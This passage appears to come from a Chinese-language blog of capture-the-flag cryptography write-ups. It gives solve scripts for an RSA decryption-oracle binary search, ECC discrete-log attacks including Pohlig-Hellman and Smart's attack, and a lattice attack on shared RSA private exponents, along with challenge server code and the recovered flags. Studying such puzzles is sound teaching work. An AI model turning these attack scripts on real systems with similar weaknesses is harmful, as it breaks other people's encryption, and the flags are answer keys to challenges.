c,E_,V_,s_=new_cipher io.recvuntil(\u0026#39;prefix, encoder = \u0026#39;) Enc2,prefix=pre_enc=eval(io.recvuntil(\u0026#39;\\n\u0026#39;)[:-1].decode().replace(\u0026#39;L\u0026#39;,\u0026#39;\u0026#39;)) prefix=int(prefix,16) encoder=[1,(-pow(prefix,sk,pp)) %pp] prefix = long_to_bytes(prefix).rjust(64, b\u0026#39;\\x00\u0026#39;) ml=[1] for i in range(len(Enc2)): ml.append((ml[-1]*encoder[-1]+Enc2[i]*(-1)**(i+1))%pp) r=-ml[-1]%pp dd = h2(prefix + long_to_bytes(r).rjust(64, b\u0026#39;\\x00\u0026#39;)) | 1 DD*=dd d=libnum.invmod(dd,pp-1) tmp=E_*V_%pp xx=pow(tmp,d,pp) m=c*libnum.invmod(xx,pp)%pp io.send(hex(m)[2:]) io.recvuntil(\u0026#39;You are a clever boy! Now I can share you some other information!\\n0x\u0026#39;) mul=int(io.recvuntil(\u0026#39;\\n\u0026#39;)[:-2],16) ic(DD) ic(mul) #3 io.recvuntil(\u0026#39;choice\u0026gt;\u0026#39;) io.sendline(\u0026#39;3\u0026#39;) cc=int(io.recvuntil(\u0026#39;L, \u0026#39;)[1:-3]) cipher=[cc] cipher+=eval(io.recvuntil(\u0026#39;)\\n\u0026#39;)[:-2].decode().replace(\u0026#39;L\u0026#39;,\u0026#39;\u0026#39;)) ic(cipher) solve-step2\nfrom gmpy2 import * io=0xb5655f7c97e8007baaf31716c305cf5950a935d239891c81e671c39b7b5b2544b0198a39fd13fa83830f93afb558321680713d4f6e6d7201d27256567b8f70c3 D=15987058835088036058838351739905403758810826722245822649290306549906899936826738229650730140126509371862930340608846190807298868677166971678478129606238898364288362139315516922003581996769819030117310508402522153899137933429897987557331966070437119010259514160059698255241259153692392463260794449949596746727 mul=7194716155235037744823597029059822446255314248196377746260315999958188811928743123657567494196521690514320209430663462342437059567384744437239548754416135 c=mul*libnum.invmod(D,io)%io e=4 R.\u0026lt;x\u0026gt; = Zmod(io)[] f = x ^ e- c f = f.monic() res1 = f.roots() print(res1) solve-step3\nfrom Crypto.Util.number import * from gmpy2 import * pp=0xb5655f7c97e8007baaf31716c305cf5950a935d239891c81e671c39b7b5b2544b0198a39fd13fa83830f93afb558321680713d4f6e6d7201d27256567b8f70c3 sk=3415391405045794570454819264678842883406589094879440924771251075986414212665514615692960890299627279215019657097231396800926908716766924569917256830117771 cipher=[1452085683981538837849557434841689674477096081702343000869186835544808468459192026693029532721465657214194362000756249662047209552808256166535501585736401, 9299317806552199012103361766715291248186887467752322286719294121971787657296205598139365760833959784768412272593061318430853065277862724140493914797711689, 9287316455075844376168558534606543590293095721271733423230961724912040658757071778242087450272981713664977773510705690081763692753388091475741636185572383, 229110517869350912236518454062717456777603700368163296438479618211042488031942897036793380693680124455343059560507824269299022538059530971380675264277197] c,E,V,s=cipher xx=E*V%pp m=c*libnum.invmod(pow(xx,sk,pp),pp)%pp print(long_to_bytes(m)) #flag{504d0411-6707-469b-be31-9868200aca95} 学到很多\n蓝帽ber final # https://github.com/ljahum/crypto-challenges/tree/main/%E8%93%9D%E7%8C%AB2021/final/twoBytes\ntwobyte # 二分法\n传入$C\\times padding^e$\n利用高位的two bytes判断$M\\times padding和2^{496}$的大小关系(512-16=496)\n利用二分法查找padding的值\n查找约1000+次可以恢复secret\nsolve # from subprocess import run from Crypto.Util.number import long_to_bytes from icecream import * from pwn import * import re from pwnlib.util.iters import pad def b2s(s): if(type(s)==str): return s else: return s.decode() def CatNum(txt): txt = b2s(txt) matchObj = re.findall(r\u0026#39;[0-9]+\u0026#39;, txt) return matchObj def dec(n): print(io.recvuntil(\u0026#39;Your choice: \u0026#39;)) io.sendline(\u0026#39;1\u0026#39;) print(io.recvuntil(\u0026#39;Your cipher: \u0026#39;)) io.sendline(str(n)) return io.recvline()[:-1] def bigger(mid,c): # tmp1 = pow(mid,e,n) # ic(tmp1) tmp = (c*pow(mid,e,n))%n print(tmp) # ic(padding) m = dec(tmp) ic(m) if(m!=b\u0026#39;0000\u0026#39;): return True else: return False io=remote(\u0026#39;0.0.0.0\u0026#39;,10001) # print(io.recv(1024)) io.recvuntil(\u0026#39;PKCS1_v1_6?(y/n)\u0026#39;) io.sendline(\u0026#39;n\u0026#39;) e = int(CatNum(io.recvline())[0]) n = int(CatNum(io.recvline())[0]) c = int(CatNum(io.recvline())[0]) ic(e,c,n) \u0026#39;\u0026#39;\u0026#39;估算padding范围 padding = 1 h = 0 for i in range(512): tmp1 = pow(padding,e,n) ic(tmp1) tmp = (c*tmp1)%n print(tmp) ic(padding) m = dec(tmp) ic(m,i) if(m!=b\u0026#39;0000\u0026#39;): h=i input() break padding *= 2 \u0026#39;\u0026#39;\u0026#39; # pad=240~260 pl = 2**200 ph = 2**496 mid= (pl+ph)//2 input() for i in range(512): # tmp = m*mid # ic(tmp-n) if(bigger(mid,c)==True): ph=mid-1 mid = (mid+pl)//2 else: pl=mid+1 mid =(mid+ph)//2 # print(mid) # input() ic(mid) n=2**496 s =n//mid secret = long_to_bytes(s) ic(secret) ic(secret.hex()) print(io.recvuntil(\u0026#39;Your choice: \u0026#39;)) io.sendline(\u0026#39;2\u0026#39;) io.sendline(secret.hex()) sleep(0.5) print(io.recv(1024)) b\u0026#39;Your choice: \u0026#39; b\u0026#34;You know my secret? (in hex): b\u0026#39;flag{ba1f2511fc30423bdbb183fe33f3dd0f}\u0026#39;\\n\u0026#34; [*] Closed connection to 0.0.0.0 port 10001   /mnt/c/U/16953/Desktop/twoBytes took  11s at  11:38:42 AM ❯ document for 5th space2021 # 唯一以有点意思的找最短向量问题（SVP）听说一堆非预期打烂了，能找到的wp全是非预期（笑🤣 感觉不如。。。。画质\nECC # 三段ECC的套娃，一看就是找老年赛棍出的缝合题，记了没用 不记又不行\nTask\nprint \u0026#39;Try to solve the 3 ECC\u0026#39; from secret import flag from Crypto.Util.number import * assert(flag[:5]==\u0026#39;flag{\u0026#39;) flag = flag[5:-1] num1 = bytes_to_long(flag[:7]) num2 = bytes_to_long(flag[7:14]) num3 = bytes_to_long(flag[14:]) def ECC1(num): p = 146808027458411567 A = 46056180 B = 2316783294673 E = EllipticCurve(GF(p),[A,B]) P = E.random_point() Q = num*P print E print \u0026#39;P:\u0026#39;,P print \u0026#39;Q:\u0026#39;,Q def ECC2(num): p = 1256438680873352167711863680253958927079458741172412327087203 #import random #A = random.randrange(389718923781273978681723687163812) #B = random.randrange(816378675675716537126387613131232121431231) A = 377999945830334462584412960368612 B = 604811648267717218711247799143415167229480 E = EllipticCurve(GF(p),[A,B]) P = E.random_point() Q = num*P print E print \u0026#39;P:\u0026#39;,P print \u0026#39;Q:\u0026#39;,Q factors, exponents = zip(*factor(E.order())) primes = [factors[i] ^ exponents[i] for i in range(len(factors))][:-1] print primes dlogs = [] for fac in primes: t = int(int(P.order()) / int(fac)) dlog = discrete_log(t*Q,t*P,operation=\u0026#34;+\u0026#34;) dlogs += [dlog] print(\u0026#34;factor: \u0026#34;+str(fac)+\u0026#34;, Discrete Log: \u0026#34;+str(dlog)) #calculates discrete logarithm for each prime order print num print crt(dlogs,primes) def ECC3(num): p = 0xd3ceec4c84af8fa5f3e9af91e00cabacaaaecec3da619400e29a25abececfdc9bd678e2708a58acb1bd15370acc39c596807dab6229dca11fd3a217510258d1b A = 0x95fc77eb3119991a0022168c83eee7178e6c3eeaf75e0fdf1853b8ef4cb97a9058c271ee193b8b27938a07052f918c35eccb027b0b168b4e2566b247b91dc07 B = 0x926b0e42376d112ca971569a8d3b3eda12172dfb4929aea13da7f10fb81f3b96bf1e28b4a396a1fcf38d80b463582e45d06a548e0dc0d567fc668bd119c346b2 E = EllipticCurve(GF(p),[A,B]) P = E.random_point() Q = num*P print E print \u0026#39;P:\u0026#39;,P print \u0026#39;Q:\u0026#39;,Q ECC1(num1) print \u0026#39;==============\u0026#39; ECC2(num2) print \u0026#39;==============\u0026#39; ECC3(num3) stage1 # 很明显给的这几个数很小，用sage自带的离散对数求解三件套梭一遍得到答案\np = 146808027458411567 A = 46056180 B = 2316783294673 E = EllipticCurve(GF(p),[A,B]) P = E(119851377153561800,50725039619018388) Q = E(22306318711744209, 111808951703508717) n = discrete_log(Q, P, operation=\u0026#39;+\u0026#39;) print(n) # 13566003730592612 stage2 # 考烂的CRT in ECC知识点\n一半特征是E.order()分解出来的素因子有问题，一般特征就是前面的因子都不大，后面有一个很大的因子\n同时你还可以知道n其实也不是太大，E.order()就是ECC的阶，意思就是这整个ECC的曲线上一共有多少个不同的离散的点\nrefer：\nblueHat final PicoCTF 2017: ECC2 某领航杯被py烂的题 p = 1256438680873352167711863680253958927079458741172412327087203 a = 377999945830334462584412960368612 b = 604811648267717218711247799143415167229480 gx = 550637390822762334900354060650869238926454800955557622817950 gy = 700751312208881169841494663466728684704743091638451132521079 px = 1152079922659509908913443110457333432642379532625238229329830 py = 819973744403969324837069647827669815566569448190043645544592 E = EllipticCurve(GF(p), [a, b]) G = E(gx, gy) n = E.order() QA = E(px, py) factors = list(factor(n)) m = 1 moduli = [] remainders = [] print(f\u0026#34;[+] Running Pohlig Hellman\u0026#34;) print(factors) for i, j in factors: if i \u0026gt; 10**9: print(i) break mod = i**j g2 = G*(n//mod) q2 = QA*(n//mod) r = discrete_log(q2, g2, operation=\u0026#39;+\u0026#39;) remainders.append(r) moduli.append(mod) m *= mod r = crt(remainders, moduli) print(r) # 16093767336603949 # 9-2521- stage3 # E.order() = p的时候 可以用一个叫做SMART攻击的操作\n去年学的时候见到过，但换电脑搞没了，索性在记录一遍\np = 0xd3ceec4c84af8fa5f3e9af91e00cabacaaaecec3da619400e29a25abececfdc9bd678e2708a58acb1bd15370acc39c596807dab6229dca11fd3a217510258d1b A = 0x95fc77eb3119991a0022168c83eee7178e6c3eeaf75e0fdf1853b8ef4cb97a9058c271ee193b8b27938a07052f918c35eccb027b0b168b4e2566b247b91dc07 B = 0x926b0e42376d112ca971569a8d3b3eda12172dfb4929aea13da7f10fb81f3b96bf1e28b4a396a1fcf38d80b463582e45d06a548e0dc0d567fc668bd119c346b2 E = EllipticCurve(GF(p),[A,B]) P = E(10121571443191913072732572831490534620810835306892634555532657696255506898960536955568544782337611042739846570602400973952350443413585203452769205144937861,8425218582467077730409837945083571362745388328043930511865174847436798990397124804357982565055918658197831123970115905304092351218676660067914209199149610) Q = E(964864009142237137341389653756165935542611153576641370639729304570649749004810980672415306977194223081235401355646820597987366171212332294914445469010927,5162185780511783278449342529269970453734248460302908455520831950343371147566682530583160574217543701164101226640565768860451999819324219344705421407572537) def SmartAttack(P,Q,p): E = P.curve() Eqp = EllipticCurve(Qp(p, 2), [ ZZ(t) + randint(0,p)*p for t in E.a_invariants() ]) P_Qps = Eqp.lift_x(ZZ(P.xy()[0]), all=True) for P_Qp in P_Qps: if GF(p)(P_Qp.xy()[1]) == P.xy()[1]: break Q_Qps = Eqp.lift_x(ZZ(Q.xy()[0]), all=True) for Q_Qp in Q_Qps: if GF(p)(Q_Qp.xy()[1]) == Q.xy()[1]: break p_times_P = p*P_Qp p_times_Q = p*Q_Qp x_P,y_P = p_times_P.xy() x_Q,y_Q = p_times_Q.xy() phi_P = -(x_P/y_P) phi_Q = -(x_Q/y_Q) k = phi_Q/phi_P return ZZ(k) r = SmartAttack(P, Q, p) print(r) # 19597596255129283097357413993866074145935170485891892 # 4a81-9957-8c3381622434 Document for 东华ber2021 # py大赛 诸神黄昏，依旧是抽一中午午休记一下题\nThersa # 又是一个考烂的水题\nsrc\nfrom Crypto.Util.number import* from hashlib import sha256 import socketserver import signal import string import random from secret import flag table = string.ascii_letters+string.digits flag = bytes_to_long(flag) MENU = br\u0026#39;\u0026#39;\u0026#39;[+] 1.Get Encrypt: [+] 2.Exit: \u0026#39;\u0026#39;\u0026#39; class Task(socketserver.BaseRequestHandler): def _recvall(self): BUFF_SIZE = 2048 data = b\u0026#39;\u0026#39; while True: part = self.request.recv(BUFF_SIZE) data += part if len(part) \u0026lt; BUFF_SIZE: break return data.strip() def send(self, msg, newline=True): try: if newline: msg += b\u0026#39;\\n\u0026#39; self.request.sendall(msg) except: pass def recv(self, prompt=b\u0026#39;[-] \u0026#39;): self.send(prompt, newline=False) return self._recvall() def proof_of_work(self): proof = (\u0026#39;\u0026#39;.join([random.choice(table)for _ in range(20)])).encode() sha = sha256( proof ).hexdigest().encode() self.send(b\u0026#34;[+] sha256(XXXX+\u0026#34; + proof[4:] + b\u0026#34;) == \u0026#34; + sha ) XXXX = self.recv(prompt = b\u0026#39;[+] Plz Tell Me XXXX :\u0026#39;) if len(XXXX) != 4 or sha256(XXXX + proof[4:]).hexdigest().encode() != sha: return False return True def EncRy(self): p,q = getPrime(512),getPrime(512) n = p * q phi = (p - 1) * (q - 1) e = inverse(self.d, phi) c = pow(flag, e, n) return(e,n,c) def handle(self): signal.alarm(60) if not self.proof_of_work(): return self.send(b\u0026#34;Welcome to my RSA!\u0026#34;) self.d = getPrime(random.randint(435, 436)) while 1: self.send(MENU) self.send(b\u0026#34;Now!What do you want to do?\u0026#34;) option = self.recv() if option == b\u0026#39;1\u0026#39;: self.send(str(self.EncRy()).encode()) else: break self.request.close() class ThreadedServer(socketserver.ThreadingMixIn, socketserver.TCPServer): pass class ForkedServer(socketserver.ForkingMixIn, socketserver.TCPServer): pass if __name__ == \u0026#34;__main__\u0026#34;: HOST, PORT = \u0026#39;0.0.0.0\u0026#39;, 10004 print(\u0026#34;HOST:POST \u0026#34; + HOST+\u0026#34;:\u0026#34; + str(PORT)) server = ForkedServer((HOST, PORT), Task) server.allow_reuse_address = True server.serve_forever() 所有的密文都是通过 $d$ 去产生实现的,common private key 攻击\nrefer：\nSctf2020 rsa vn公开赛factor(印象中是叫这个) 根据实际情况应该是可以获取$N$组 再照着样例\n改改参数大小使其满足题目要求和论文给的范围即可\nsolve # #sagemath from Crypto.Util.number import * from gmpy2 import iroot e1,n1,c1=(42930516866813661342965746223080520747639541783178165319930798466029922118238472375394025163017796792784301240279788973937514266651107411418409008126879890591634663600650622272276047586523991529128830751549916767006347857754606279093837920255744001556692088644997689518547315534397835105708024032114104233381, 77791057667316752688491344909349631143733665781985333450578141862483326292146944912417154290062439390262044781769179125790833684914883275144238169619259170245799297149721759503884049470266984858779855785527134093827380541390671671421065142834758715718012985245418556303458870683285396736465075774918756943849, 27391282824232696321494182390733866553767929957526280387298565758936575846502788790274502139115326807546265156509536800727262991966913839267428385697513824611497066201158201419561518562486879276509945503450941372856450148181065616319630297566761526958666976256485612007573889257294374864202830099675167224618) e2,n2,c2=(19018427406275508266725318182604693048036959850117857989040747866263767206396699322550948080332092809132375761217132996919018670944100226583113345224541762253472497934634295339952030040768111601599444464038423922436192382234875739639531699502158126381323466372283051777517214602215819494796932567681821951661, 79650072081042322662491093415989067423342888043380140123956989961183485888095357404757819859263343837741065918473041502132392064045360290315160760995892876549211580451883428599900857896989098491504167023490425266678783550124590746460833416198860457961338080633882718390420924183342764921882749848062331837157, 47371054845953307458071281584547821822800567401012561479295024891414125620585367467768382853051493673297474227621983913977611690329004811247719468085248653560735761224575841708898687339051979667968682445741679494814049520035089826802489552786717808162007554429409373562206869161512981004103668781786261071642) e3,n3,c3=(56543738058355787650458463296434379628548490866377456720748305513368031407432713681493384526759984858874833739323541806113831186630548095096957902346105190080635673052132358289744367039154224900185478860894300958278206372821874050674031918453348499825234769506256225325221089605204424199863739802675837768205, 79745878045239534073349506401894614077391259818245570439963094062152853043757431813193065050329923218395626939202508409314449221246402655169069682907439636880572885333431797158404833511447487493689075229003167933950464179409482597295179818105362744282535280033320439360295379327350145598779754591726149053127, 8406272869509814810291187732784177513812310985481896410437026715571367365909106171597609902128681517191154832846694541582315046341089395251486352127008536629880180333790535980063006233315170237788757595367545197059456798192233574190206607791108247915315239293315856045620536743732064060419019383653017754432) e4,n4,c4=(7084543689346197121827870073257673792657047196994323608218552636377497641605010832530473677981880825830062575269956770329035892637961925305684535520357897676757195804280616332451896105146968442795337854851958165225390355543144975973394614878012047483478453541789213191489356453542050105788672267671186622349, 84193779290507365404703859402732143439109001210124769414375603074891153195964512465635919253078833439745459555371587096356222637979782540883867956964113419688015746698472168356238337484900265019835855499846392509934587316309130977694018626484013012355408173625138875013785514921191427955103949196185104270953, 57188209081624431651145335231083235968076151504975133709205719008833316979899965113559550632823577949531094733328627686996343950189156687337540064474041791342122016380351392782138752676861412964076387375179224936788921872659232295048921383561342206164767267043862968315447568792822076799329961025512641107246) e5,n5,c5=(42832642928335275352734567465034497040617823999922718556444541540637575945318881858516365030723712293566938969239323128990546490351954020139702168583195387467822779475617077682710213996418869245088581793014583647801408719774140042233362914483058594181044708264940880873371340427513033621237883600041744259821, 100914764703986796503524746926824107407478498950896766954709765945739896574588237451261683044947676026816706250675210414995572771552251740398776761522312876711308663303631592599847201703544166011694904414367791567937596616962437750298179607007543994344224571625128530174980427056520743554240699599606017732453, 21119798060505043638458066841637396779462197838711219768901795233508035124251444985142140372296435557972489164083922904128749582124708137219016012302886951596946166275929450048887248788479585841059063956921630092232393741155010454512377332292347344811575552765907485744387780176768333870372377008256136186807) e6,n6,c6=(92302858091592048530164341892874939881833483518095068563859833484262743798872223903571012516471302801063982503961657026303472815350321491051234131656128422061238653211376015684800612577226731646341043305151595034538237258802687294046312571159904343739248977644957644677771388548256577367489970379574172464797, 117679207537303828303181692131284163456980142622326819854887578740836701695007074712199364783113450072522001526705110176578644797269399966145551464701075583136732122232247312391436901027876012971338176518412247421456590394727819899354372288058334724615114926953982773216858342784870874502568283116049857599697, 694728970163274338952272545132120395722399912878027385515433411574332882874655233664187165540396449753083157039600465154030742189987900065124001404191085619372639241055402339355981737758090185934672051842827196968679043511560501886410676350912217561099905662581686696249610217183042166978654689061472935255) e7,n7,c7=(107958832210740007280315466139290077026935359625782760172740000594364460869128124940009236566874443252250812468875065019322671201219651761405497245501179554045401769228061173131905805679002507830926816675819378142336365243119257538909791638758850962854709130774816448647965771903108760260693930942445832581613, 124514631670412396955583333186310036282392256402221528788219590875160132086163249366732298557562280446982290995056571347900001555142302304165284003543211879382117786568833925378625035366897845326134848510307881296792070242801270087606140027163068970890264029919788362871312210162525628755395528824620664275981, 122802204066940916090785459557228909264312462241661083272739613123469038467287559936112649653314041478655145859464338716094314561339632033669065696677349425900229495594900454878607113262204411164149182327233978867883052370242620750529133958835635598563284037235210030872798337887481034016325891031269539006959) e8,n8,c8=(93032879096884833976354856506992993862316449685244948137669996162571278621479404733170084750947866321488473290655001676203288675188640293830346141700535957251408373865922564197265494466697836691672035371673758770683433485891640334014710181418750508413205768593981082149070901287189919968858883490943111987181, 126814261604881133528727989048158217150888497288150533655112145843950045425282139821602599229665745129453799945609742281626549287640177663087578340721569938344685390347348772958990014616194819409373556039354672378457009008450988307789399181204535224407248419395946571885338535639198634359608298711433536942733, 95330490027741440826424434337219961367405797139516869535055648011514837588374299753114991801669135223731470401046346436845011624597842223950760050976711965720535288001750040424144530196787933771814541562581236974965361143703635725068380670591839954283253531181890717506164459934317393787888216914582168459996) sqrn8=iroot(n8,2)[0] M=[ [sqrn8,e1,e2,e3,e4,e5,e6,e7,e8], [0,-n1,0,0,0,0,0,0,0], [0,0,-n2,0,0,0,0,0,0], [0,0,0,-n3,0,0,0,0,0], [0,0,0,0,-n4,0,0,0,0], [0,0,0,0,0,-n5,0,0,0], [0,0,0,0,0,0,-n6,0,0], [0,0,0,0,0,0,0,-n7,0], [0,0,0,0,0,0,0,0,-n8] ] M=matrix(ZZ,M) M=M.LLL() if M[0][0]\u0026lt;0: M=-M d,t1=M[0][0]//sqrn8,M[0][1] k1=(d*e1-t1)//n1 s1=(t1-1)//k1-1 var(\u0026#39;x\u0026#39;) F=x^2-s1*x+n1 p,q=F.roots()[0][0],F.roots()[1][0] p,q=abs(p),abs(q) d=inverse_mod(Integer(e1),(Integer(p)-1)*(Integer(q)-1)) print(long_to_bytes(pow(c1,d,n1))) #b\u0026#39;flag{338f4482-4f11-496c-a0d7-b06df53f79c5}\u0026#39; BlockEncrypt # 原文给了个pyc，但是复盘就懒得解包了捏\nsrc\nfrom Crypto.Util.number import* from Crypto.Cipher import AES from secret import flag from my_encrypt import block_encrypt from hashlib import sha256 import socketserver import signal import string import random import os table = string.ascii_letters+string.digits MENU = br\u0026#39;\u0026#39;\u0026#39;[+] 1.Encrypt the Flag: [+] 2.Encrypt your Plaintext: [+] 3.Exit: \u0026#39;\u0026#39;\u0026#39; def pad(m): padlen = 16 - len(m) % 16 return m + padlen * bytes([padlen]) def xor(msg1,msg2): assert len(msg1)==len(msg2) return long_to_bytes(bytes_to_long(msg1)^bytes_to_long(msg2)) class Task(socketserver.BaseRequestHandler): def _recvall(self): BUFF_SIZE = 2048 data = b\u0026#39;\u0026#39; while True: part = self.request.recv(BUFF_SIZE) data += part if len(part) \u0026lt; BUFF_SIZE: break return data.strip() def send(self, msg, newline=True): try: if newline: msg += b\u0026#39;\\n\u0026#39; self.request.sendall(msg) except: pass def recv(self, prompt=b\u0026#39;[-] \u0026#39;): self.send(prompt, newline=False) return self._recvall() def proof_of_work(self): proof = (\u0026#39;\u0026#39;.join([random.choice(table)for _ in range(20)])).encode() sha = sha256( proof ).hexdigest().encode() self.send(b\u0026#34;[+] sha256(XXXX+\u0026#34; + proof[4:] + b\u0026#34;) == \u0026#34; + sha ) XXXX = self.recv(prompt = b\u0026#39;[+] Plz Tell Me XXXX :\u0026#39;) if len(XXXX) != 4 or sha256(XXXX + proof[4:]).hexdigest().encode() != sha: return False return True def enc_msg(self,msg): return block_encrypt(pad(msg),self.key,self.ivv) def handle(self): signal.alarm(50) if not self.proof_of_work(): return self.ivv = os.urandom(16) self.key = os.urandom(16) while 1: self.send(MENU,newline = False) option = self.recv() if (option == b\u0026#39;1\u0026#39;): self.send(b\u0026#34;My Encrypted flag is:\u0026#34;) self.send(self.enc_msg(flag)) elif option == b\u0026#39;2\u0026#39;: self.send(b\u0026#34;Give me Your Plain \u0026amp; I\u0026#39;ll give you the Cipher.\u0026#34;) plaintext = self.recv() self.send(b\u0026#39;PlainText:\u0026#39; + plaintext + b\u0026#39;\\nCipherText:\u0026#39; + self.enc_msg(plaintext)) else: break self.send(b\u0026#34;\\n[.]Down the Connection.\u0026#34;) self.request.close() class ThreadedServer(socketserver.ThreadingMixIn, socketserver.TCPServer): pass class ForkedServer(socketserver.ForkingMixIn, socketserver.TCPServer): pass if __name__ == \u0026#34;__main__\u0026#34;: HOST, PORT = \u0026#39;0.0.0.0\u0026#39;, 10004 print(\u0026#34;HOST:POST \u0026#34; + HOST+\u0026#34;:\u0026#34; + str(PORT)) server = ForkedServer((HOST, PORT), Task) server.allow_reuse_address = True server.serve_forever() api my_encrypt.py\nfrom Crypto.Util.number import * Sbox = ( 0x63, 0x7C, 0x77, 0x7B, 0xF2, 0x6B, 0x6F, 0xC5, 0x30, 0x01, 0x67, 0x2B, 0xFE, 0xD7, 0xAB, 0x76, 0xCA, 0x82, 0xC9, 0x7D, 0xFA, 0x59, 0x47, 0xF0, 0xAD, 0xD4, 0xA2, 0xAF, 0x9C, 0xA4, 0x72, 0xC0, 0xB7, 0xFD, 0x93, 0x26, 0x36, 0x3F, 0xF7, 0xCC, 0x34, 0xA5, 0xE5, 0xF1, 0x71, 0xD8, 0x31, 0x15, 0x04, 0xC7, 0x23, 0xC3, 0x18, 0x96, 0x05, 0x9A, 0x07, 0x12, 0x80, 0xE2, 0xEB, 0x27, 0xB2, 0x75, 0x09, 0x83, 0x2C, 0x1A, 0x1B, 0x6E, 0x5A, 0xA0, 0x52, 0x3B, 0xD6, 0xB3, 0x29, 0xE3, 0x2F, 0x84, 0x53, 0xD1, 0x00, 0xED, 0x20, 0xFC, 0xB1, 0x5B, 0x6A, 0xCB, 0xBE, 0x39, 0x4A, 0x4C, 0x58, 0xCF, 0xD0, 0xEF, 0xAA, 0xFB, 0x43, 0x4D, 0x33, 0x85, 0x45, 0xF9, 0x02, 0x7F, 0x50, 0x3C, 0x9F, 0xA8, 0x51, 0xA3, 0x40, 0x8F, 0x92, 0x9D, 0x38, 0xF5, 0xBC, 0xB6, 0xDA, 0x21, 0x10, 0xFF, 0xF3, 0xD2, 0xCD, 0x0C, 0x13, 0xEC, 0x5F, 0x97, 0x44, 0x17, 0xC4, 0xA7, 0x7E, 0x3D, 0x64, 0x5D, 0x19, 0x73, 0x60, 0x81, 0x4F, 0xDC, 0x22, 0x2A, 0x90, 0x88, 0x46, 0xEE, 0xB8, 0x14, 0xDE, 0x5E, 0x0B, 0xDB, 0xE0, 0x32, 0x3A, 0x0A, 0x49, 0x06, 0x24, 0x5C, 0xC2, 0xD3, 0xAC, 0x62, 0x91, 0x95, 0xE4, 0x79, 0xE7, 0xC8, 0x37, 0x6D, 0x8D, 0xD5, 0x4E, 0xA9, 0x6C, 0x56, 0xF4, 0xEA, 0x65, 0x7A, 0xAE, 0x08, 0xBA, 0x78, 0x25, 0x2E, 0x1C, 0xA6, 0xB4, 0xC6, 0xE8, 0xDD, 0x74, 0x1F, 0x4B, 0xBD, 0x8B, 0x8A, 0x70, 0x3E, 0xB5, 0x66, 0x48, 0x03, 0xF6, 0x0E, 0x61, 0x35, 0x57, 0xB9, 0x86, 0xC1, 0x1D, 0x9E, 0xE1, 0xF8, 0x98, 0x11, 0x69, 0xD9, 0x8E, 0x94, 0x9B, 0x1E, 0x87, 0xE9, 0xCE, 0x55, 0x28, 0xDF, 0x8C, 0xA1, 0x89, 0x0D, 0xBF, 0xE6, 0x42, 0x68, 0x41, 0x99, 0x2D, 0x0F, 0xB0, 0x54, 0xBB, 0x16, ) InvSbox = ( 0x52, 0x09, 0x6A, 0xD5, 0x30, 0x36, 0xA5, 0x38, 0xBF, 0x40, 0xA3, 0x9E, 0x81, 0xF3, 0xD7, 0xFB, 0x7C, 0xE3, 0x39, 0x82, 0x9B, 0x2F, 0xFF, 0x87, 0x34, 0x8E, 0x43, 0x44, 0xC4, 0xDE, 0xE9, 0xCB, 0x54, 0x7B, 0x94, 0x32, 0xA6, 0xC2, 0x23, 0x3D, 0xEE, 0x4C, 0x95, 0x0B, 0x42, 0xFA, 0xC3, 0x4E, 0x08, 0x2E, 0xA1, 0x66, 0x28, 0xD9, 0x24, 0xB2, 0x76, 0x5B, 0xA2, 0x49, 0x6D, 0x8B, 0xD1, 0x25, 0x72, 0xF8, 0xF6, 0x64, 0x86, 0x68, 0x98, 0x16, 0xD4, 0xA4, 0x5C, 0xCC, 0x5D, 0x65, 0xB6, 0x92, 0x6C, 0x70, 0x48, 0x50, 0xFD, 0xED, 0xB9, 0xDA, 0x5E, 0x15, 0x46, 0x57, 0xA7, 0x8D, 0x9D, 0x84, 0x90, 0xD8, 0xAB, 0x00, 0x8C, 0xBC, 0xD3, 0x0A, 0xF7, 0xE4, 0x58, 0x05, 0xB8, 0xB3, 0x45, 0x06, 0xD0, 0x2C, 0x1E, 0x8F, 0xCA, 0x3F, 0x0F, 0x02, 0xC1, 0xAF, 0xBD, 0x03, 0x01, 0x13, 0x8A, 0x6B, 0x3A, 0x91, 0x11, 0x41, 0x4F, 0x67, 0xDC, 0xEA, 0x97, 0xF2, 0xCF, 0xCE, 0xF0, 0xB4, 0xE6, 0x73, 0x96, 0xAC, 0x74, 0x22, 0xE7, 0xAD, 0x35, 0x85, 0xE2, 0xF9, 0x37, 0xE8, 0x1C, 0x75, 0xDF, 0x6E, 0x47, 0xF1, 0x1A, 0x71, 0x1D, 0x29, 0xC5, 0x89, 0x6F, 0xB7, 0x62, 0x0E, 0xAA, 0x18, 0xBE, 0x1B, 0xFC, 0x56, 0x3E, 0x4B, 0xC6, 0xD2, 0x79, 0x20, 0x9A, 0xDB, 0xC0, 0xFE, 0x78, 0xCD, 0x5A, 0xF4, 0x1F, 0xDD, 0xA8, 0x33, 0x88, 0x07, 0xC7, 0x31, 0xB1, 0x12, 0x10, 0x59, 0x27, 0x80, 0xEC, 0x5F, 0x60, 0x51, 0x7F, 0xA9, 0x19, 0xB5, 0x4A, 0x0D, 0x2D, 0xE5, 0x7A, 0x9F, 0x93, 0xC9, 0x9C, 0xEF, 0xA0, 0xE0, 0x3B, 0x4D, 0xAE, 0x2A, 0xF5, 0xB0, 0xC8, 0xEB, 0xBB, 0x3C, 0x83, 0x53, 0x99, 0x61, 0x17, 0x2B, 0x04, 0x7E, 0xBA, 0x77, 0xD6, 0x26, 0xE1, 0x69, 0x14, 0x63, 0x55, 0x21, 0x0C, 0x7D, ) xc = lambda a: (((a \u0026lt;\u0026lt; 1) ^ 0x1B) \u0026amp; 0xFF) if (a \u0026amp; 0x80) else (a \u0026lt;\u0026lt; 1) R = ( 0x00, 0x01, 0x02, 0x04, 0x08, 0x10, 0x20, 0x40, 0x80, 0x1B, 0x36, 0x6C, 0xD8, 0xAB, 0x4D, 0x9A, 0x2F, 0x5E, 0xBC, 0x63, 0xC6, 0x97, 0x35, 0x6A, 0xD4, 0xB3, 0x7D, 0xFA, 0xEF, 0xC5, 0x91, 0x39, ) def t2m(text): text = bytes_to_long(text) matrix = [] for i in range(16): byte = (text \u0026gt;\u0026gt; (8 * (15 - i))) \u0026amp; 0xFF if i % 4 == 0: matrix.append([byte]) else: matrix[i // 4].append(byte) return matrix def m2t(matrix): text = 0 for i in range(4): for j in range(4): text |= (matrix[i][j] \u0026lt;\u0026lt; (120 - 8 * (4 * i + j))) return long_to_bytes(text) class myAES: def __init__(self, MasterKey): self.ChangeKey(MasterKey) def ChangeKey(self, MasterKey): self.RoundKeys = t2m(MasterKey) # print self.RoundKeys for i in range(4, 4 * 11): self.RoundKeys.append([]) if i % 4 == 0: byte = self.RoundKeys[i - 4][0] \\ ^ Sbox[self.RoundKeys[i - 1][1]] \\ 